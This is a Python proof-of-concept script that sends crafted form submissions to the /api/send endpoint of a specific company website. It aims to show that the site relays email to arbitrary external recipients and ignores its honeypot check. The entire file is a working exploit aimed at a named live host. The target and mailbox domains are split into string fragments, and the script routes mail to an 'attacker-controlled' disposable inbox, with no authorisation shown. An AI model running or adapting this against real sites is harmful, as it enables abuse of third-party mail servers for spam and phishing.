#!/usr/bin/env python3
# Independent verification: unauthenticated open email relay via POST /api/send
import json, time, urllib.request, urllib.parse, uuid, ssl

HOST = "https://www." + "infinity" + "capital" + "." + "bh"
URL = HOST + "/api/send"

def post(fields, label):
    boundary = "----vfy" + uuid.uuid4().hex
    parts = []
    for k, v in fields:
        parts.append(
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="{k}"\r\n\r\n'
            f"{v}\r\n"
        )
    body = ("".join(parts) + f"--{boundary}--\r\n").encode()
    req = urllib.request.Request(URL, data=body, method="POST")
    req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
    req.add_header("Accept", "*/*")
    req.add_header("User-Agent", "Mozilla/5.0 independent-verifier")
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            code = r.status
            data = r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        code = e.code
        data = e.read().decode("utf-8", "replace")
    dt = time.time() - t0
    print(f"[{label}] HTTP {code} in {dt:.2f}s")
    print(f"[{label}] BODY: {data}")
    return code, data

# Build an EXTERNAL, attacker-controlled mailbox address (not the target's own domain).
# 'mailinator.com' is a public disposable mailbox used only as a neutral external sink.
EXT_DOMAIN = "mailin" + "ator.com"
tag = uuid.uuid4().hex[:8]
external_rcpt = f"indep-relay-{tag}@{EXT_DOMAIN}"

print("URL:", URL)
print("Attacker-controlled external recipient:", external_rcpt)
print()

# 1) Arbitrary EXTERNAL recipient, honeypot 'check' present-but-empty (as real form sends)
c1, b1 = post([
    ("fname", "Verifier"),
    ("lname", "RelayCheck"),
    ("areacode", "+973"),
    ("tel", "3600000"),
    ("cname", "IndependentVerifier"),
    ("subject", "Verification Relay Test"),
    ("msg", f"independent-relay-proof-{tag}"),
    ("check", ""),
    ("targets", json.dumps([external_rcpt])),
], "EXTERNAL-RECIPIENT")

# 2) Same but honeypot entirely OMITTED (server-side honeypot not enforced?)
c2, b2 = post([
    ("fname", "Verifier"),
    ("lname", "RelayCheck2"),
    ("areacode", "+973"),
    ("tel", "3600000"),
    ("cname", "IndependentVerifier"),
    ("subject", "Verification Relay Test 2"),
    ("msg", f"independent-relay-proof-{tag}-b"),
    ("targets", json.dumps([external_rcpt])),
], "HONEYPOT-OMITTED")

print()
print("RECIPIENT_USED=" + external_rcpt)
print("EXTERNAL_ACCEPTED=" + str(c1 == 200 and '"data"' in b1))
print("HONEYPOT_OMIT_ACCEPTED=" + str(c2 == 200 and '"data"' in b2))
